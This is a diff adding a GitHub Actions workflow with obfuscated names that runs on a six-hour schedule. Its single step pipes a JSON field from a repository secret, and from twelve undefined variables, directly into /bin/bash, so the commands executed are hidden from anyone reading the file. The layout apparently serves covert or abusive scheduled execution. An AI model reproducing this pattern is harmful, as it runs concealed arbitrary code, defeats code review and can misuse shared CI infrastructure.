@@ -1,0 +1,28 @@
+name: yidongping8761
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yidongping8761
+        env:
+          t744: ${{ secrets.t744 }}
+        run: |
+          echo $t744 | jq -r .vwtxu4552 | /bin/bash
+          echo $pykkz239 | jq -r .i49683 | /bin/bash
+          echo $pxql5 | jq -r .jyt2 | /bin/bash
+          echo $hqli5 | jq -r .l1465 | /bin/bash
+          echo $vb3477 | jq -r .kk999 | /bin/bash
+          echo $fl37927 | jq -r .xcglo888 | /bin/bash
+          echo $rmndv7 | jq -r .r02112 | /bin/bash
+          echo $e4251 | jq -r .xtji211 | /bin/bash
+          echo $sdrz4 | jq -r .iyj8347 | /bin/bash
+          echo $puix710 | jq -r .p6343 | /bin/bash
+          echo $hse538 | jq -r .ry644 | /bin/bash
+          echo $ncu4343 | jq -r .drwjl43890 | /bin/bash
+          echo $b8144 | jq -r .phe3 | /bin/bash
+
